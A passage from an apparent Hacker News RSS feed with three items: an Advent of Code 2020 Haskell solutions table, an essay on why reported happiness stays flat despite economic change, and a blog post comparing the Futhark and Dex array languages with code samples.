      <td><a href="https://adventofcode.com/2020/day/4">4</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-4">↗</a></td>
      <td>Validation</td>
      <td><a href="https://hackage.haskell.org/package/split">split</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/5">5</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-5">↗</a></td>
      <td>Decoding</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/6">6</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-6">↗</a></td>
      <td><em>None</em></td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/7">7</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">↗</a></td>
      <td>Parsing, graphs</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a>, <a href="https://hackage.haskell.org/package/graph-wrapper">graph-wrapper</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/8">8</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-8">↗</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/9">9</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-9">↗</a></td>
      <td><em>None</em></td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/10">10</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-10">↗</a></td>
      <td>Graphs, memoization</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/11">11</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-11">↗</a></td>
      <td>Cellular automata, zippers</td>
      <td><a href="https://hackage.haskell.org/package/comonad">comonad</a>, <a href="https://hackage.haskell.org/package/containers/docs/Data-Sequence.html">Data.Sequence</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/12">12</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-12">↗</a></td>
      <td>Geometry</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/13">13</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-13">↗</a></td>
      <td>Number theory</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/14">14</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-14">↗</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/15">15</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-15">↗</a></td>
      <td>Number sequence</td>
      <td><a href="https://hackage.haskell.org/package/vector/docs/Data-Vector-Unboxed-Mutable.html">Data.Vector.Unboxed.Mutable</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/16">16</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-16">↗</a></td>
      <td>Parsing, constraint satisfaction</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/17">17</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">↗</a></td>
      <td>Cellular automata, zippers</td>
      <td><a href="https://hackage.haskell.org/package/comonad">comonad</a>, <a href="https://hackage.haskell.org/package/base/docs/Data-List.html">Data.List</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/18">18</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-18">↗</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/19">19</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-19">↗</a></td>
      <td>Parsing</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/20">20</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-20">↗</a></td>
      <td>Image manipulation</td>
      <td><a href="https://hackage.haskell.org/package/bitwise/docs/Data-Array-BitArray.html">Data.Array.BitArray</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/21">21</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-21">↗</a></td>
      <td>Parsing, constraint satisfaction</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/22">22</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-22">↗</a></td>
      <td>Recursion, game</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/23">23</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-23">↗</a></td>
      <td>Linked list, game</td>
      <td><a href="https://hackage.haskell.org/package/vector/docs/Data-Vector-Primitive-Mutable.html">Data.Vector.Primitive.Mutable</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/24">24</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-24">↗</a></td>
      <td>Parsing, cellular automata</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a>, <a href="https://hackage.haskell.org/package/containers/docs/Data-Map-Strict.html">Map</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/25">25</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-25">↗</a></td>
      <td>Cryptography</td>
      <td><em>None</em></td>
    </tr>
  </tbody>
</table>

    </main>
    
  </div></div>]]>
            </description>
            <link>https://notes.abhinavsarkar.net/2020/aoc-learnings</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560044</guid>
            <pubDate>Mon, 28 Dec 2020 15:45:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is Everyone so damn happy?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25560021">thread link</a>) | @RickJWagner
<br/>
December 28, 2020 | https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy | <a href="https://web.archive.org/web/*/https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>I</h2><p>There's a piece of rhetoric that's extremely popular and extremely compelling. It goes something as the following. Sometime over the past four to five decades, we moved into an economy that absolutely doesn't help the working men and women. As a result prices for essentials have soared beyond all recognition, income has fallen for labour, it has fallen even further for those lower down the wealth scale, and most of the gains have all gone to the top 1%.</p><p>But one piece of insight stays inside this tale of woe much like grit in an oyster. It's the fact that annoyingly, a large enough proportion also claim to be happier than they were before.</p><p>What gives?</p><p>For one thing, the self reported life satisfaction in most countries hasn't dropped all that much. Looks like through the biggest financial crisis of around a century and the best boom times before where every stripper seemed to have briefly <a href="https://latimesblogs.latimes.com/money_co/2007/06/tuesday-morning-tales-from-the-bubble----how-a-22-year-old-stripper-bought-10-houses.html">become a real estate mogul</a>, the overall life satisfaction was ... curiously flat?What if we go further back in time?</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png&quot;,&quot;height&quot;:485,&quot;width&quot;:781,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>What if we go further back in time?   </p><p>The map looks slightly more complex, but not by a lot. Bear in mind this period saw around four (or five, depending on how you count) major recessions and/or depressions. The fall of the pound, the Asian financial crisis, the dot com boom, the dot com bust, the credit crunch and countless other major macroeconomic events, all put together made minor changes. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fb9bee809-10e6-4d06-b42c-54a036b20cb5_784x508.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fb9bee809-10e6-4d06-b42c-54a036b20cb5_784x508.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/b9bee809-10e6-4d06-b42c-54a036b20cb5_784x508.png&quot;,&quot;height&quot;:508,&quot;width&quot;:784,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>The only major revelations here seem to be that the Greeks are upset after the financial crisis. And that the Germans had a hard decade in the 1990s (maybe something to do with unification throwing part of the country into turmoil perhaps?).</p><p>But it's staggering that for the most part it still trends up even in countries that have seen objective measures of people's unhappiness (or reported as such), including the UK which happily Brexited in annoyance at everyone else surrounding them!</p><p>And in this period, the inequality of happiness has fallen consistently in almost every country you can think of.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F42d1ef56-7b34-4a66-a7fb-5faf410d0409_780x496.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F42d1ef56-7b34-4a66-a7fb-5faf410d0409_780x496.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/42d1ef56-7b34-4a66-a7fb-5faf410d0409_780x496.png&quot;,&quot;height&quot;:496,&quot;width&quot;:780,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So is it the case that people simply are way too optimistic and/or pessimistic, and that they can't help understand what happiness means to each other?</p><p>Probably not. One of my favourite understanding that came from this deep dive is that it seems literally everyone in the world thinks that others are less happy than they say. It seems this is skepticism run amok!</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff4cbc957-09c7-496f-9401-6329587a39e2_550x550.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff4cbc957-09c7-496f-9401-6329587a39e2_550x550.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f4cbc957-09c7-496f-9401-6329587a39e2_550x550.png&quot;,&quot;height&quot;:550,&quot;width&quot;:550,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>What if we are simply measuring baselines wrong? After all satisfaction and happiness seem like concepts weighted with cultural baggage, and people might tend to put those in context when we answer.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc4d60d9d-38b1-448d-95ff-eddb06970a60_3000x2032.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc4d60d9d-38b1-448d-95ff-eddb06970a60_3000x2032.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/c4d60d9d-38b1-448d-95ff-eddb06970a60_3000x2032.png&quot;,&quot;height&quot;:986,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>Seems to not be a major concern either. I mean, Latin America seems oddly happy with all the coups and currency crises and jaguars roaming over there, but they're not off the charts. Looks like with some minor variation everyone seems to be on the same page.</p><p>So why is everyone so damn happy?</p><h2>II</h2><p>An article in the New York Times by Steven Quartz and Anette Asp called <a href="https://www.nytimes.com/2015/04/12/opinion/sunday/unequal-yet-happy.html">Unequal Yet Happy</a> makes this case.</p><blockquote><p>For most of human history, inequality of wealth meant inequality of happiness. Status, and its related activities, envy and emulation, drove consumption. By the 1950s, rapidly rising standards of living across the West, combined with social pressures to conform, all conspired to intensify status competition. The architects of “rebel cool,” like Jack Kerouac and Norman Mailer, responded by rebelling against emulation consumption and the status hierarchy of postwar America. They inverted the dominant social hierarchy, rejecting the values of those at the top and appropriating the values of those who had been marginalized at the bottom.</p><p>This trade-off comes at a political price, as it makes income inequality less emotionally salient. In a 2013 poll asking Americans to name the most important problems facing the country, only 5 percent cited income inequality or concerns about the poor or middle class (though a recent Gallup poll did find that 67 percent of Americans were dissatisfied with the current income distribution). Politicians from Senator Elizabeth Warren on the left to Representative Paul D. Ryan on the right are talking about inequality, but President Obama has lately been talking more about “opportunity.”</p><p>The proliferation of consumer choice helps explain why today’s Gilded Age hasn’t sparked as much outrage as the last one. Money may not buy happiness in the long run, but consumer choice has gone a long way in keeping most Americans reasonably content, even if they shouldn’t be.</p></blockquote><p>It essentially says that while yeah, we all hate the fact that getting sick costs a bomb, having a roof over your head is crazy expensive, and getting an education means mortgaging your whole life, but as long as you're not being actively crushed under that pressure, life's pretty great. There's Netflix ! And you can even travel anywhere you like - the airplane industry obligingly hasn't turned a profit in decades.</p><p>Is that the answer then? We're so happy with the consumer devices we carry around in our pockets that even though we don't make as much money and life's much harder, we don't care.</p><p>Chalk one up to the awesomeness of the iPhone.</p><p>But in a completely unsurprising addendum to the overall picture, turns out people are more satisfied with their life when they make more money.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/aa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png&quot;,&quot;height&quot;:1019,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So there is an unmistakable and very strong correlation across income and happiness across most countries. People are happier when they are richer, and even more happier when they get more richer when in richer countries.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F041040ce-2b46-4f06-a7e8-d813fe9b92ae_768x563.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F041040ce-2b46-4f06-a7e8-d813fe9b92ae_768x563.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/041040ce-2b46-4f06-a7e8-d813fe9b92ae_768x563.png&quot;,&quot;height&quot;:563,&quot;width&quot;:768,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So is this a kink in the theory that there does seem to be a rising trend in happiness which seems to say people are kinda 'meh' about their dropping incomes and purchasing power?</p><p>There was an observation made by a bummer economist called Richard Easterlin that tried to get to the second derivative of this. He said, looking at the time when satisfaction stagnated in the US between 1946 and 1970, that while richer countries have higher happiness levels, the growth rates in the happiness levels in richer countries didn't seem to be keeping pace with the increase in national incomes. Bear in mind this was a golden age post WWII when the GDP grew 65%+.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9d23a6a3-1d80-462f-b088-4c410b383800_1800x1398.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9d23a6a3-1d80-462f-b088-4c410b383800_1800x1398.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/9d23a6a3-1d80-462f-b088-4c410b383800_1800x1398.png&quot;,&quot;height&quot;:1131,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>The life satisfaction seems to be uniquely uncorrelated with the annual growth rate of GDP per capita. Could it be that the growth that we're seeing in GDP comes primarily from growth in population? That would mean that that while GDP is growing, it's doing so because there are just more people. They can't all be equally happy at something they made come about by the difficult feat of being born.</p><p>To quote from <a href="https://www.pnas.org/content/107/52/22463">his paper</a>:</p><blockquote><p>Simply stated, the happiness–income paradox is this: at a point in time both among and within nations, happiness varies directly with income, but over time, happiness does not increase when a country's income increases. We are talking here about the time series relationship of happiness and income in the long term, usually at least 10 years, sometimes more. As we shall see, the short-term relationship is a different story.</p></blockquote><p>This though only seemed to hold across countries as in the charts above. And it's not a linear relationship by any means, more of a trend seen from above. Just growing doesn't seem to be enough to get people happy.</p><p>The problem with the charts above is that they're point-in-time snapshots, and even the ones that seem to draw trends from one time to another seem to pick few datapoints rather than do even a cursory p-hack.</p><p>And the argument that Easterlin et al advance is that in the long run, a higher rate of economic growth by itself does not result in a greater increase in happiness.</p><p>The plot thickens.</p><h2>III</h2><p>The answer it seems, as is so often the case, comes from unpacking the "average" that's measured into it's component distribution.</p><p>Take the US for instance. The answer is not that people have gotten unhappier in the US in aggregate, or even in average. It's that while there has been modest growth in incomes over this period, it's barely kept pace, which means that the happiness index has been (at best) flat. While this isn't true if you do that graph solely for the top 1% in the income percentile, they don't seem to matter enough to sway this particular graph. While they do matter enough to sway the average income and GDP per capita graphs.</p><blockquote><p><a href="https://www.pnas.org/content/107/52/22463">This article</a> also contributes unique systematic evidence for developing and transition countries that short-term contractions and expansions are accompanied by corresponding movements in subjective well-being. Thus, in the short term, happiness and SWB are positively related, but over the long term—here, usually a minimum period of 10 y—the relationship is nil. The happiness–income paradox now holds for countries ranging from poor to rich: among countries, at a point in time happiness and income are positively related, but over time within a country, happiness does not increase as income goes up.</p><p>Consider, for example, three countries included here with very high recent growth rates of GDP—China, South Korea, and Chile. China's growth rate implies a doubling of real per capita income in less than 10 y; South Korea's, in 13 y; and Chile's, in 18 y. With the real per capita amount of goods multiplying so rapidly in a fraction of a lifetime, one might think many of the people in these countries would be so happy, they'd be dancing in the streets. Yet both China and Chile show mild (not statistically significant) declines in life satisfaction</p></blockquote><p>What this seems to indicate is that the impact of change in economic circumstances takes time to get ossified into the societal structures which (not too rapidly) increases satisfaction. So what does make people happy, or at least satisfied with their life? It's like a combination of a current reality metric and a future expectation metric. You need to feel like life's pretty good right now and also that it will continue to get better.</p><p>Easterlin also spoke about something quite similar. That our expectations from life grows as time goes on and incomes increase, so …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy">https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy</a></em></p>]]>
            </description>
            <link>https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560021</guid>
            <pubDate>Mon, 28 Dec 2020 15:42:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Comparison of Futhark and Dex]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25559967">thread link</a>) | @Athas
<br/>
December 28, 2020 | https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html | <a href="https://web.archive.org/web/*/https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      

<p>
    Posted on December 28, 2020
    
        by Troels Henriksen
    
</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I’m not a Dex expert, so maybe I’ve missed a thing here or there.</p>
<p>Futhark wasn’t originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it’s fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex’s authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L₁ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we’d write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex’s approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you’d actually write this program in Futhark. Instead you’d first define a function for computing the L₁ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you’d apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it’s an interesting contrast that I think is due to the two language’s different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a “traditional” combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L₁ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it’s still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I’m not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex’s index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)
   xsCov</code></pre>
<p>In Futhark we write it as:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>let</span> covariance0 [n] (xs:[n]f64) (xsm:f64) (ys:[n]f64) (ysm:f64) =</span>
<span id="cb7-2">  f64.sum (map2 (\x y -&gt; (x-xsm) * (y-ysm)) xs ys) / f64.i64 (n<span>-1</span>)</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>let</span> covariance [n][d] (xs:[n][d]f64) =</span>
<span id="cb7-5">  <span>let</span> xsT = transpose xs</span>
<span id="cb7-6">  <span>let</span> means = map mean xsT</span>
<span id="cb7-7">  <span>in</span> map2 (\a a_mean -&gt;</span>
<span id="cb7-8">             map2 (\b b_mean -&gt; covariance0 a a_mean b b_mean)</span>
<span id="cb7-9">                  xsT means)</span>
<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It’s certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
